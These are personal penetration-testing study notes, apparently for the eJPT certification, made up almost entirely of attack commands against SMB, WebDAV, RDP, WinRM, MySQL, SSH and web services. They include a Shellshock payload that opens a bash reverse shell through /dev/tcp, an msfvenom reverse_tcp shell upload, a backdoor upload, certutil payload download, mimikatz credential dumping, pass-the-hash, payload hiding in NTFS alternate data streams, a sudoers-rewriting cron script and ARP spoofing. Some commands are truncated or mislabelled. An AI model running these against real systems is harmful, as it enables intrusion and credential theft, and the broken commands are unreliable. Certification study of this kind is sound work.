# ejpt

# Assessment Methodologies: Information Gathering

## Scanning:
**Passive Scan**: No directly contact with the victim

**Active Scan**: Directly contact with the victim

## Passive Scan:
To gather 
- ip addresses `host target.local` 
- hidden directly from search engines like `robots.txt` `sitemap.xml`
- Email Addresses 
- Phone Numbers
- Physical Addresses
- Web Technologies like `wappalyzer` `builtWith` `whatweb`
You can also download the whole website with `HTTrack`
**Tools**: `whois` `whois.is` `netcraft.com` 

**DNS Recon**: `dnsrecon` `dnsdumpster.com` 

**Firewall detect**: `wafw00f` 

**Subdomain Enumeration**: `Sublist3r` this tool may get blocked by google because we sends a tons of request

**google dorks**: `site:*.target.local` `inurl:form` `intitle:admin` `filetype:pdf` `intitle:"index of"`
`Waybackmachine` `exploit-db.com` 

**Email Gathering**: `theharvester`

**Leaked Databases**: `haveibeenpwned.com`


## Active Scann
DNS Records:
**A** : domain to IPv4
**AAAA** : domain to IPv6
**NS** : reference to domain nameserver
**MX** : domain to a mail server
**CNAME** : for domain aliases
**TXT** : Text records
**HINFO** : Host Information
**SOA** : domain authority
**SRV** : Service Records
**PTR** : IP to domains

**Zone Transfer**: copy or transfer zone files from one DNS server to another
DNS File on Linux: /etc/hosts

Tools: `dnsenum` `fierce` 

**Host Discovery**: `nmap >nmap -sn ip # -sn: no port scan`  `netdiscovery`
-> Have a look at nmap option (Cheat sheet)
Note: Some firewall blocks the ping packet, so to avoid sending it `nmap -Pn ip`


Banner: `nc $ip $port`



# Assessment Methodologies: Footprinting & Scanning

## Mapping the network
> arp-scan -I $interface -g ip/24

> fping -I $interface -g ip/24 -a 2>/dev/null

> nmap -sn ip/24

> zenmap

## Scanning Hosts
-sV 
-sA
-sC
--script=discovery
-T0-4
-sT
-sU
-A
-O



# Assessment Methodologies: Enumeration

## SMB
service for file share. port 445
netbios is an old version. port 139

to map a network drive on windows:
**GUI**: click right on network -> map network drive -> `\\ip\` -> browser -> finish
**cmd**: `net use * /delete` `net use z: \\ip\c$ password /user:administrator`

enumeration with nmap:
**nmap**: `nmap -p445 --script smb-protocols ip`

**nmap**: `nmap -p445 --script smb-enum-sessions ip`

**nmap**: `nmap -p445 --script smb-enum-shares ip`

**nmap**: `nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 ip`

**nmap**: `nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 ip`

**nmap**: `nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 ip`

**nmap**: `nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 ip`

**nmap**: `nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 ip`


enumeration with smbmap:
**smbmap**: `smbmap -u username -p password -H target_IP`

**smbmap**: `smbmap -u guest -p "" -d . -H target_IP`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP`

**smbmap**: `smbmap -u administrator -p smbserver_771 -H target_IP -x "ipconfig"`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP -L`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP -r "C$"`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP --upload "/root/backdoor" "c$\backdoor"`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP --download "c$\flag"`


enumeration with metasploit:
**metasploit**: `auxiliary/smb/smb_version`

**metasploit**: `auxiliary/scanner/smb/smb_enumshares`

**metasploit**: `auxiliary/scanner/smb/sum_login` -> to bruteforce the passwords/users

hydra: `hydra -l username -P wordlist.txt $ip smb`

**nmblookup**: `nmblookup -A $ip` -> to list 

**smbclient**: `smbclient -L $ip -N` -> to list

**smbclient**: `smbclient //$ip//path -N` -> to connect

**smbclient**: `smbclient //$ip//path -U username ` -> to connect

**rpcclient**: `nmblookup -U "" -N $ip` -> to connect
`>enumdomusers` 

**enum4linux**: `enum4linux $ip`
-U for user enumeration
-G for group enumeration
-S for shares enumeration


## FTP
**anonymous login**: `ftp $ip` 

**hydra**: `hydra -L users.txt -P passwords.txt $ip ftp`

**nmap**: `nmap $ip -p 21 --script ftp*`


## SSH
**nmap**: `nmap $ip -p 22 --script ssh*`

**nmap**: `nmap $ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`

**nmap**: `nmap $ip -p 22 --script ssh-auth-methods --script-args="ssh.user=$user"` -> to check if user need a password to login

-> to bruteforce
**nmap**: `nmap $ip -p 22 --script ssh-brute --script-args userdb=/root/user`

**hydra**: `hydra -L users.txt -P passwords.txt $ip ssh`

**metasploit**: `auxiliary/scanner/ssh/ssh_login`


## HTTP
**nmap**: `nmap $ip -p80,443 -sV -O`

**nmap**: `nmap $ip -p80,443 --script http*`

**nmap**: `nmap $ip -p80,443 --script http-header`

**nmap**: `nmap $ip -p80,443 --script http-enum`

**nmap**: `nmap $ip -p80,443 --script http-methods --script-args http-methods.url-path=/webdav/`

**whatweb**: `whatweb $ip`

**dirsearch**: `dirsearch -u $ip` or dirb: `dirb $url wordlist.txt`

**browsh**: `browsh --startup-url http://$ip` -> to browser the page on the console

**lynx**: `lynx http://$ip`  -> to browser the page on the console

**metasploit**: `auxiliary/scanner/http/http_version`

**metasploit**: `auxiliary/scanner/http/brute_dirs`

**metasploit**: `auxiliary/scanner/http/robots_txt`


## MySQL
port: 3306 
**nmap**: `nmap $ip -sV -p 3306 --script=mysql-info`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-database --script-args mysqluser="root",mysqlpass=""`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-users --script-args=mysqluser="root",mysqlpass=""`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-variables --script-args=mysqluser="root",mysqlpass=""`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-audit --script-args=mysql-audit.username="root",mysql-audith.password="",mysql-audit.filename="/usr/share/nmap/nselib/data/mysql-cis.audit"`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-dump-hashes --script-args=username="root",password=""`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-query --script-args=query="select * from books.author;",username="root",password=""`

```
>mysql -h $ip -u $username -> login to the database
>show databases;
>use $database;
>SELECT * from $database;
>SELECT load_file("/etc/shadow");
```

**metasploit**: `auxiliary/s w

**hydra**: `hydra -L users.txt -P passwords.txt $ip mysql`
 
port:1433
**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-info`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-ntlm-info --script-args mssql.instance-port=1433`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-brute --script-args=userdb=users.txt,passdb=passwords.txt`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-empty-password`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-query --script-args=ms-sql-query="select * from master..syslogins;",mssql.username="root",mssql.password="" -oN output.txt`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-dump-hashes --script-args=mssql.username="root",mssql.password="password123"`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-xp-cw


**metasploit**: `auxiliary/scanner/mssql/mssql_`


# Assessment Methodologies: Vulnerability Assessment

Case Studies

**Heartbleed**: `nmap -p 443 --script ssl-heartbleed $ip` and for exploitation search on exploit-db.com or metasploit

How it works?

Client -> Set Password: 1234 + Password_length:4 -> Server

Client <- Confirm Password: 1234 + Password_length:4 <- Server

Attacker -> Set Password: 1234 + Password_length:50 -> Server

Attacker <- Confirm Password: 1234jalslaklasa + Password_length:50 <- Server

Here The Server will send data from memory to fillfull the password length. so these data from server momery could be sensitive!!

**EternalBlue-MS17-010**: `nmap $ip --script smb-vuln-ms17-010` and for exploitation search on exploit-db.com or metasploit

**log4J**: 

Nessus

# Auditing Fundamentals
Theory :)

# 3.1 System-Host Based Attacks
# Windows
- Microsoft IIS is a web server. port:80/443
- WebDAV is an extension to delete/update/move/copy files on a server. port:80/443
- SMB/CIFS is a network share protocol. port:445
- RDP is  a remote access protocol. port:3389 (disable by default)
- WinRM is a remote management protocol. port:5986/443 (enable by default)

## Microsoft IIS
Supported executable file extension:
- .asp - .aspx - .config - .php

## WebDAV
tools: 
- **davtest**: to check what we can move/upload/execute on the server.
`davtest -auth username:password -url http://$ip` 
- **cadaver**: support cli to upload/download/delete/move/copy files on the server
`cadaver http://$ip/webdav`
`put /usr/share/webshells/asp/webshell.asp` -> to upload a shell on the server
- **hydra**: To break WebDAV basic authenication
`hydra -L users.txt -P passwords.txt $ip http-get /webdav/`

to exploit: 
1. nmap to identify
2. break the basic authentication (guess or hydra)
3. devtest
4. cadaver

exploit with metasploit:
Way one:
1. create a shell `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > shell.asp`
2. upload the shell with cadaver `put shell.asp`
3. start the listener 
`msfconsole`
`use multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set lhost $ip`
`set lport $port`
`run`
4. open the shell on the target and reverse connection will be recieved
`meterpreter> sysinfo`
`meterpreter> getuid`

Way two:
`msfconsole`
`search iis upload`
`use $payload`
`set $options`
`run`


## SMB
PsExec is a tool similar to RDP but it uses the cli
Exploit with psexec tool:
- to bruteforce: `msfconsole;search smb_login`
  `nmap --script smb-brute.nse -p445 <host>`
  `hydra -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`
- to access: `psexec.py Administrator@$ip cmd.exe`

Exploit with metasploit modul
`use /exploit/windows/smb/psexec`

Exploiting Eternalblue:
-> Working on Systems that are running SMBv1 only

-> to check: `nmap -sV -p445 --script=smb-vuln-ms17-010 $ip`

-> Exploit AutoBlue from github or using metasploit

-> AutoBlue: download AutoBlue -> run the bash script -> open listener `nc -nvlp 1234` -> `python eternalblue_exploit7.py $target_ip shellcode/sc_x64.bin`

-> metasploit `msfconsole;search eternalblue`


## RDP
to enumerate -> `msfconsole; search rdp_scanner`

to bruteforce-> `hydra -l administrator -P /usr/share/wordlists/rockyou.txt $ip rdp -s $port`

to connect-> `xfreerdp /u:administrator /p:passowrd123 /v:$target_ip:port`

Exploiting BlueKeep: `msfconsole; search bluekeep`
remember to set a target `show targets; set target $number`, if you do not know your target, try all of them :)


## WinRM
exploit with tools:
- **crackmapexec**: to bruteforce and also run commands on target
  - `crackmapexec winrm $target_ip -u administrator -p passwords.txt`
  - `crackmapexec winrm $target_ip -u administrator -p password123 -x "systeminfo"`
- **evil-winrm**: to get command shell session 
  `evil-winrm.rb -u administrator -p password123 -i $target_ip`

exploit with metasploit:
`msfconsole; search winrm`
remember to force to use the VBS cmdStager `set FORCE_VBS true`



# Privilege Escalation
-> Metasploit: `search suggester`

-> meterpreter: `getsystem`

-> linux/windows_suggester from github
also by getting the systeminfo, run `systeminfo`, then copy the information and save them in a file, then pass that file to the linux/windows_suggester tool. `*suugester.py --systeminfo win.txt`

### Bypass UAS (User Account Control)
Tools:
- UACME from github: upload it on target and run the payload using it `.\Akagi64.exe 23 paylaod.exe`, make sure to start your listener to get the session connection.

## Access Token Impersonation
Windows Access Token are created by winlogon.exe process and managed by LSASS for authentication process. this token is then attached to the userinit.exe process, which all child process that runs under the user will copy that token and run under the privilege of that user.

Privileges that are required for impersonate attack:

**SeAssignPrimaryToken**: This allows a user to impersonate tokens

**SeCreateToken**: This allows a user to create a arbitrary token with administrative priviliges.

**SeImpersonatePrivilege**:This allows a user to create a process under a security context of another user with administrative privileges


Incognito is a built-in meterpreter module to impersonate user tokens after exploitation..
```
meterpreter> pgrep explorer -> to migrate the session to another process and explorer process is recommended. and if you run `getprivs` but you get and error do that also.
meterpreter> migrate $explorer_id
meterpreter> getuid
meterpreter> getprivs
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "$name_of_the_token"
meterpreter> getuid
and keep doing that until you found the "NT AUTHORITY/SYSTEM"
```
## Alternate Data Streams (ADS)
ADS is an NFTS file attribute. 
Any file create on NTFS formatted drive will have 2 different forks/streams:
- Data Stream: Default stream that contain the data of the file
- Resource stream: typically contains the metadata of the file 
Here attacker can use ADS to hide malicious code by storing it in the file attribute resource stream(metadata) to evade detection
1. open cmd
2. `cmd> notepad test.txt`
3. `cmd> notepad test.txt:secrets.txt`
4. `cmd> type payload.exe > test.txt:payload.exe`
5. `cmd> start test.txt:payload.exe` -> error, so we create a symbol link for that
5. `cmd> mklink wupdate.exe test.txt:payload.exe` 
6. `cmd> wupdate` -> whenever you type wupdate the payload will be executed!

you can hide any type of files!!!!!


## Windows Credential Dumping
-> Windows stores hashed user account passwords locally in the SAM database. It encrypted with a syskey.
-> Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).
-> look at LM/NTLM hashing and how they work!

## Windows Configuration Files
These files contain user account and system informations encoded with base64
`C:\Windows\Panther\Unattend.xml`
`C:\Windows\Panther\Autounattend.xml`
so download them with the meterpreter session and look in them for users credentials
and use `psexec.py Administrator@$ip` to connect to that user and higher privileges.

`certutil -urlcache -f https://$ip/payload.exe payload.exe` -> download payload.exe with cmd


## Hashdump with mimikatz - persistence
**mimikatz** is a tool to extract clear-text passwords from the lsass.exe process memory where hashes are cached. 
**Kiwi** is meterpreter built-in tool similar to mimikatz.
Everything happen on memory. Mimikatz extract the hashes from momery not from SAM file!!!

```
meterpreter> pgrep lsass
meterpreter> migrate $lsass_ip -> this step will give you a higher privileges
meterpreter> getuid
meterpreter> load kiwi
meterpreter> ? -> for help for kiwi
meterpreter> lsa_dump_sam -> to get NTLM users credentials

meterpreter> cd c:\\
meterpreter> mkdir Temp
meterpreter> cd Temp
meterpreter> upload mimikatz.exe
meterpreter> .\mimikatz.exe
mimikatz# privilege::debug -> check if we have privileges
mimikatz# lsadump::sam
mimikatz# lsadump::secrets
mimikatz# sekurlsa::logonpasswords
```

## Pass the hash attack
Tools: 
- **metsaploit PsExec module**,
- **Crackmapexec**

after getting an admin privileges, do
`meterpreter> load kiwi`
`meterpreter> lsa_dump_sam`  to get NTLM users credentials
`meterpreter> hashdump` 

to exploit
-> with metasploit `search smb/psexec`
For this module you need to set target (command/native upload/...) and you need the LM:NTLM hash, not only the NTML hash 
-> with crachmapexec `crackmapexec smb $ip -u administrator -H $NTLM_hash- x "ifconfig"`



# Linux

## Exploiting Shellshock
nmap: `nmap -sV $ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`

inject payload in User-Agent header with burpsuite: `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`
inject payload in User-Agent header with burpsuite: `() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/$ip/$port 0>&1'`

metasploit: `search shellshock`
metasploit: `search http/apache_mod_cgi`
You need to specify the $target_ip and the $target_uri


## FTP
port 21, and there are many ftp service like proFTP
**Bruteforce**: `hydra -L users.txt -P passwords.txt $ip ftp`
**metasploit**: `search ProFTP`
**searchsploit**: `searchsploit ProFTP`


## SSH
port 22 
**Bruteforce**: `hydra -L users.txt -P passwords.txt $ip ssh`


## SAMBA
port 445, old version of samba is NetBios port 139

**hydra**: to bruteforce `hydra -L users.txt -P passwords.txt $ip smb`

**metasploit**: to bruteforce `search smb_login`

**smbmap**: to enumerate the shares `smbmap -H $ip -u admin -p password123`

**smbclient**: to enumerate the shares `smbclient -L $ip -U admin`

**smbclient**: to access the shares `smbclient //$ip/folderToAccess -U admin`

**emum4linux**: to enumerate all informations about the OS `enum4linux -a $ip`



## Privilege Escalation
**tools**: linux-exploit-suggester

**cronjobs**: look for cronjobs that runs scripts as root privileges `crontab -l` to list the cronjobs but it does not work everytime(why??)

after we found the file, that runs automatically, we go search what scripts uses that file. `grep -rnw / -e "/home/student/file_cronjob" 2>/dev/null`. This command will list the script/file that contains that path!. so we edit that script/file to get higher privileges. Ex: `printf '#!/bin/bash\necho "username ALL=NOPASSWD:ALL">> /etc/sudoers' > Script_Path`

`sudo -l` -> to list sudoers permissions

`student>sudo su` will be entered to root user with no password!!!

**Exploiting SUID Binaries**: 

/etc/passwd

/etc/shadow

$1 -> MD5

§2 -> Blowfish

$5 -> SHA-256

$6 -> SHA-512

# 3.2 Network-Based Attacks

## Tshark
-> Start capturing traffics with tshark
`tshark -i wlan0 -w capture-output.pcap`

-> Read from a pcap file
`tshark -r capture-output.pcap`

-> capture http request and filter for host and user-agent
`tshark -i wlan0 -Y http.request -T fields -e http.host -e http.user_agent`

-> 
`tshark -r traffic.pcap -Y "http contains password"`

`tcp.flags.reset==1`

`ip.dst==192.168.1.10`

`-T fields -E separator=, -e ip.src -e ip.dst`

`not (tcp.port == 80) and not (tcp.port == 25) and ip.addr == 192.168.0.1`

`not arp and not (udp.port == 53)`

`tshark -r traffic.pcap -Y "http contains password"`

`tshark -r traffic.pcap -Y "http.request.method==GET && http.host==yahoo.com" -T fields -e ip.dst`

`tshark -r traffic.pcap -Y "ip contains amazon.com && ip.src==192.168.1.1" -e ip.src -e http.cookie`

`tshark -r traffic.pcap -Y "ip.src==192.168.1.1 && http" -T fields -e http.user_agent`

-> capture and filter for POST method and contains password
`tshark -i wlan0 -Y 'http.request.method == POST and tcp contains "password"'`

-> display how many line captured in the test.pcap
`tshark -r test.cap | wc -l`

-> read the first 100 line (file) or capture only the first 100 packets (interface)
`tshark -r test.pcap -c 100`

-> print all protocols 
`tshark -r test.pcap -T fields -e frame.protocols`

-> show only the http or tcp or arp traffic
`tshark -r test.pcap http or tcp or arp`

-> print only packets only source IP and URL for all GET request packets
`tshark -r HTTP_traffic.pcap -Y "http.request.method==GET" -T fields -e ip.src -e http.host`


## wireshark
https://www.comparitech.com/net-admin/wireshark-cheat-sheet/


## ARP

`echo 1 > /proc/sys/net/ipv4/ip_forward`

`arpspoof -i <network adapter> -t <victim IP address> -r <gateway IP address>`

`arpspoof -i eth0 -t 10.10.1.4 -r 10.10.1.1`


# 3.3 The Metasploit Framework (MSF)
